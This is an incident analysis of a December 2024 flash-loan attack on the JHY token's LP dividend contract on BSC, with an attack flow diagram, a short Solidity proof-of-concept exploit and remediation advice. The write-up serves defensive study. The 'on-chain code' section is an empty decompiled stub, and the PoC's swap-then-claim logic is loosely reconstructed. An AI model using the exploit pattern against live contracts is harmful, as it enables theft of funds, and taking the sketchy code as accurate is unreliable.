# JHY — Dividend Manipulation Flash Loan Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-17 |
| **Protocol** | JHY Token |
| **Chain** | BSC |
| **Loss** | ~11,000 USD |
| **Attacker** | [0x00000000dd](https://bscscan.com/address/0x00000000dd0412366388639b1101544fff2dce8d) |
| **Attack Tx** | [0xb6a9055e](https://bscscan.com/tx/0xb6a9055e3ce7f006391760fbbcc4e4bc8df8228dc47a8bb4ff657370ccc49256) |
| **Vulnerable Contract** | [0x40Cd735D](https://bscscan.com/address/0x40Cd735D49e43212B5cb0b19773Ec2A648aAA96c) |
| **Root Cause** | The DIVIDEND_JHYLP contract calculates dividends based on the current LP balance without snapshotting the JHY LP balance, allowing overclaiming of dividends by manipulating LP balance within a single block |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/JHY_exp.sol) |

---
## 1. Vulnerability Overview

The JHY LP dividend contract (DIVIDEND_JHYLP) distributed dividends based on JHY LP token holdings. Because dividend calculation depended on the LP balance at the current block, an attacker was able to borrow USDT via a PancakeV3 flash loan, temporarily acquire a large amount of JHY LP, and overclaim dividends.

## 2. Vulnerable Code Analysis

```solidity
// ❌ DIVIDEND_JHYLP: dividend calculation based on current LP balance
contract DividendJHYLP {
    function claimDividend(address user) external {
        // ❌ dividend calculated from LP balance at current block
        uint256 lpBalance = IERC20(JHY_LP).balanceOf(user);
        uint256 dividend = lpBalance * dividendPerLP / 1e18;
        // ❌ flash loan temporarily inflates LP balance → overclaimed dividends
        IERC20(USDT).transfer(user, dividend);
    }
}

// ✅ Fix:
// Snapshot-based dividend calculation (record balance at a specific block)
// Or require LP lock at time of claim (minimum N blocks)
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: JHY_decompiled.sol
contract JHY {
    function balanceOf(address p0) external view returns (uint256) {}  // ❌ vulnerability
```

## 3. Attack Flow

```
Attacker (0x00000000dd)
  │
  ├─[1]─▶ Deploy AttackContract1 → Deploy AttackContract2
  │
  ├─[2]─▶ PancakeV3 flash loan: borrow large amount of USDT
  │
  ├─[3]─▶ callback():
  │         Swap USDT → JHY (acquire LP)
  │         └─ Hold large amount of JHY LP
  │
  ├─[4]─▶ Call DIVIDEND_JHYLP.claimDividend()
  │         └─ ❌ Overclaim dividends based on current block LP balance
  │
  ├─[5]─▶ Sell JHY → USDT
  │
  ├─[6]─▶ Repay flash loan
  │
  └─[7]─▶ ~11,000 USD net profit
```

## 4. PoC Code

```solidity
contract AttackContract2 {
    function attack() public {
        // Acquire LP by swapping USDT → JHY
        address[] memory BSC_JHY_PATH = new address[](2);
        BSC_JHY_PATH[0] = BSC_USD;
        BSC_JHY_PATH[1] = JHY_ADDR;

        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokens(
            IERC20(BSC_USD).balanceOf(address(this)),
            0, BSC_JHY_PATH, address(this), block.timestamp
        );

        // ❌ Overclaim dividends based on LP balance
        IDividend(DIVIDEND_JHYLP).claimDividend(address(this));

        // Sell JHY → USDT
        address[] memory JHY_BSC_PATH = new address[](2);
        JHY_BSC_PATH[0] = JHY_ADDR;
        JHY_BSC_PATH[1] = BSC_USD;
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokens(
            IERC20(JHY_ADDR).balanceOf(address(this)),
            0, JHY_BSC_PATH, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Vulnerability |
| **Attack Vector** | Flash loan + dividend manipulation via current LP balance |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP** | Business Logic Vulnerability |
| **Severity** | Medium |

## 6. Remediation Recommendations

1. **Snapshot-based dividends**: Calculate dividends only from balances recorded at a specific point in time (block)
2. **Minimum holding period**: Allow dividend claims only after holding LP tokens for a minimum of N blocks
3. **Dividend cap**: Limit the maximum claimable amount per address per claim
4. **Flash loan detection**: Block dividend claims following large LP acquisition within the same transaction

## 7. Lessons Learned

- Dividend systems based on the current block balance are vulnerable to attacks that temporarily inflate balances via flash loans to overclaim rewards.
- Dividend systems should always be designed with a time lock (minimum holding period) or a snapshot mechanism.
- LP-based dividend contracts must always account for combination attacks involving AMM flash loans.